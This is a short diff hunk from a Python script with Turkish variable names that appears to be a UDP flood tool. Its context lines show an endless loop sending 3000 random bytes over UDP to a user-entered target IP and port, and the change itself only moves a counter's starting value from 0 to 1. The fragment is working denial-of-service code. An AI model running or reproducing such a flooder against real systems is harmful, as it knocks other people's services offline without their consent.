@@ -21,7 +21,7 @@ hedef_port=input("hedef port: ")
 bytes=random._urandom(3000)
 sock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
  
-sayac=0
+sayac=1
 while True:
         sock.sendto(bytes,(hedef_ip,hedef_port))
         sayac=sayac+1
